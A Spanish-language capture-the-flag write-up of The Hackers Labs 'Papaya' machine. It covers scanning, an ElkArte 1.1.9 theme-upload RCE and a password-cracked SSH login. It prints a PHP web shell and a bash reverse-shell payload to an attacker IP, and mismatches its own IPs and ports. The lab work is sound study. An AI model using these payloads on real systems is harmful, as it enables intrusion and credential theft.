# CTF - The Hackers Labs - Papaya

## 📑 Información General

- **Nombre:** Papaya
- **Dificultad:** Fácil
- **SO:** #Linux
- **Vulnerabilidad principal:** RCE (Remote Code Execution)
- **Fecha resolución:** 06/06/2025
- **MD5:** 855d57fe8086baf60cce4c69bfbd6ee1
- **Enlace:** https://thehackerslabs.com/papaya/

> Objetivo > Obtener las flags: 
> - 🚩 user.txt 
> - 🚩 root.txt

## 🔎 Reconocimiento

### Escaneo inicial

IP máquina víctima: **192.168.10.19**

Comprobamos la conectividad enviando un paquete `icmp` a dicha máquina. Además, en función del TTL sabremos distinguir el SO instalado en la misma. Dado que su TTL es 64, estamos frente a una máquina **Linux**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(1).png)

### Escaneo de Puertos

A continuación, proseguimos con un escaneo de puertos. El resultado revela que los puertos **21**, **22** y **80** se encuentran abiertos y accesibles. Además, el escaneo devuelve un fichero encontrado en el directorio compartido mediante FTP llamado **secret.txt**.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.10.19
```

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(2).png)

### Enumeración de Servicios

| Puerto | Servicio |    Versión    |         Notas         |
| ------ | -------- |:-------------:|:---------------------:|
| 21     | FTP      |       -       | Permite login anónimo |
| 22     | SSH      | OpenSSH 9.2p1 |           -           |
| 80     | HTTP     | Apache 2.4.59 |     Servidor web      |

## 🌐 Exploración

### FTP

Accedemos primero al servicio FTP para analizar el fichero **secret.txt** que tenemos a nuestro alcance. Como el servicio permite el login anónimo, no necesitaremos credenciales para poder iniciar sesión y descargar el fichero.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(3).png)

El fichero contiene la siguiente cadena:

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(4).png)

A primera vista, no parece ser un hash ni una codificación estándar. De hecho, la inclusión de la letra `ñ` me da a entender que el texto está en español y la estructura del cifrado me recuerda a un cifrado de sustitución, seguramente **Caesar**, así que intento descifrarlo mediante fuerza bruta con una herramienta de internet llamada [DCode](https://www.dcode.fr/cifrado-cesar) y descubro que con 13 desplazamientos aparece un texto que nos indica que no sigamos explorando por aquí. 

Así pues, pasamos a analizar el sitio web.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(5).png)

### Reconocimiento Web

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(6).png)

Al escribir la IP de la máquina víctima, nos redirigirá automáticamente al dominio `papaya.thl`. Lo añadimos a `/etc/hosts` para que haga la resolución correctamente y podamos acceder a ella. Escribimos el siguiente comando en la terminal:

```bash
echo '192.168.1.15 papaya.thl' >> /etc/hosts
```

Recargamos la página y esta vez sí tenemos acceso al sitio web. Vemos que estamos ante un foro cuyo sistema de gestión de contenidos es `ElkArte 1.1.9`. 

> Elkarte es un foro web gratuito y de código abierto, basado originalmente en Simple Machines Forum (SMF). Está escrito en PHP y utiliza bases de datos MySQL/MariaDB. Es una plataforma moderna y ligera, diseñada para ser fácil de usar y extensible.

Buscamos información sobre el CMS `ElkArte` en **Exploit-DB** y descubrimos que esta versión en concreto es vulnerable a exploits **RCE (Remote Code Execution)**. Más información en: https://www.exploit-db.com/exploits/52026

Seguiremos los pasos explicados en el enlace anterior.

En primer lugar, necesitaremos acceder como el usuario `admin` y subir un fichero malicioso en el apartado `Themes`.


Creamos un fichero malicioso llamado `test.php` que tendrá el siguiente contenido:

```bash
<?php system('cat /etc/passwd'); ?>
```

Lo comprimimos ejecutando `zip test.zip test.php` y lo cargamos en el instalador de temas del sitio web.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(7).png)

Ahora, abrimos el fichero desde el navegador accediendo a la siguiente ruta:

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(8).png)

## ⚔️ Explotación

Una vez comprobemos que la ejecución ha sido un éxito, configuramos un **payload** con la ayuda de  https://www.revshells.com/ y volvemos a repetir el procedimiento. El contenido del fichero `test.php` será el siguiente:

```bash
<?php system('bash -c "sh -i >& /dev/tcp/192.168.10.22/4445 0>&1"'); ?>
```

Ponemos la máquina atacante en modo escucha con el comando `nc -lvnp 4444` y accedemos nuevamente al fichero desde la url. Se nos abrirá una terminal con el usuario **www-data**. Hacemos un tratamiento de la TTY para poder navegar de forma cómoda por el sistema. 

Visualizamos el fichero `/etc/passwd` y encontramos algunos usuarios, entre ellos el usuario **papaya**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(9).png)

Listamos algunos directorios y encontramos un fichero en `/opt` llamado **pass.zip**.  Nos movemos al directorio en cuestión y levantamos un servicio web con `python` ejecutando el siguiente comando:

```bash
python3 -m http.server 8080
```

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(10).png)

Desde nuestra máquina atacante, hacemos un `wget` del fichero para descargarlo. Intentamos descomprimirlo, pero parece que tiene una contraseña. Para descifrarla, haremos uso de la herramienta **John The Ripper**. Ejecutamos los siguientes comandos para extraer el hash de la contraseña y hacerle un ataque de fuerza bruta:

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(11).png)

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(12).png)

La contraseña de `pass.zip` es **jesica**. Volvemos a descomprimir el fichero, esta vez con utilizando las credenciales que hemos obtenido y visualizamos el fichero que contiene. Es otra contraseña, seguramente del usuario **papaya**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(13).png)

Ahora, iniciaremos sesión con estas credenciales en la máquina víctima mediante el **protocolo SSH**.

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(14).png)

🚩 **Flag de user encontrada.**

## 🔐Escalada de Privilegios

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(15).png)

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(16).png)

![image](https://github.com/eliferrob/CTFs/blob/main/assets/papaya%20(17).png)

🚩 **Flag de root encontrada.**
